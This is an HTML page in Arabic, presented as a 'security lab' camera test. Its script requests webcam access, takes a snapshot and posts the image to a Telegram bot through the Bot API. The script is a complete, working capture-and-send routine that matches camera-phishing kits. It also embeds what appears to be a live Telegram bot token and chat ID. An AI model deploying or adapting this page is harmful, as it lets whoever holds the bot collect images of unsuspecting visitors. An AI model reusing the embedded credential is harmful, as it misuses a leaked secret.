<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Lab - Photo Test</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            text-align: center; 
            background: #121212; 
            color: white; 
            padding-top: 50px; 
        }
        #video { 
            width: 90%; 
            max-width: 400px; 
            border: 3px solid #0088cc; 
            border-radius: 15px; 
            display: none; 
            margin: 20px auto;
        }
        canvas { display: none; }
        .btn { 
            padding: 15px 40px; 
            font-size: 18px; 
            cursor: pointer; 
            background: #0088cc; 
            border: none; 
            border-radius: 30px; 
            color: white; 
            font-weight: bold; 
            box-shadow: 0 4px 15px rgba(0,136,204,0.3);
            transition: 0.3s;
        }
        .btn:active { transform: scale(0.95); }
        #status { margin-top: 20px; color: #aaa; }
    </style>
</head>
<body>

    <h1>معمل اختبار الأمان 🧪</h1>
    <p>اختبار التقاط الصورة وإرسالها عبر API تليجرام</p>
    
    <button class="btn" onclick="startTest()">بدء اختبار الكاميرا</button>
    
    <div id="status">جاهز للاختبار...</div>
    
    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
        // --- البيانات الخاصة بك المدمجة ---
        const TELEGRAM_TOKEN = '8260015513:AAE6SyHoiJ_xs4DHfMauue1OkqQpelhzkgI'; 
        const CHAT_ID = '8392727845'; 
        // ---------------------------------

        async function startTest() {
            const status = document.getElementById('status');
            try {
                status.innerText = "جاري طلب الإذن للكاميرا...";
                
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.style.display = 'block';
                status.innerText = "تم الاتصال.. جاري التقاط اللقطة...";

                // انتظار ثانية واحدة لضبط التركيز
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth;
                    canvas.height = video.videoHeight;
                    const context = canvas.getContext('2d');
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);

                    status.innerText = "جاري الإرسال إلى تليجرام...";

                    // تحويل اللقطة وإرسالها
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('chat_id', CHAT_ID);
                        formData.append('photo', blob, 'security_test.jpg');
                        formData.append('caption', '📸 تم التقاط صورة من اختبار المعمل الأمني');

                        fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
                            method: 'POST',
                            body: formData
                        })
                        .then(res => res.json())
                        .then(data => {
                            if(data.ok) {
                                status.innerHTML = "<b style='color:#00ff00;'>✅ نجح الاختبار! تفقد حسابك في تليجرام الآن.</b>";
                            } else {
                                status.innerHTML = "<b style='color:#ff0000;'>❌ فشل الإرسال: تأكد من تفعيل البوت (Start).</b>";
                            }
                        })
                        .catch(err => {
                            status.innerText = "خطأ في الاتصال بالخادم.";
                        });
                    }, 'image/jpeg', 0.8);
                }, 1500);

            } catch (err) {
                status.innerHTML = "<b style='color:#ff0000;'>❌ فشل: يجب السماح للكاميرا بالعمل من المتصفح.</b>";
            }
        }
    </script>
</body>
</html>
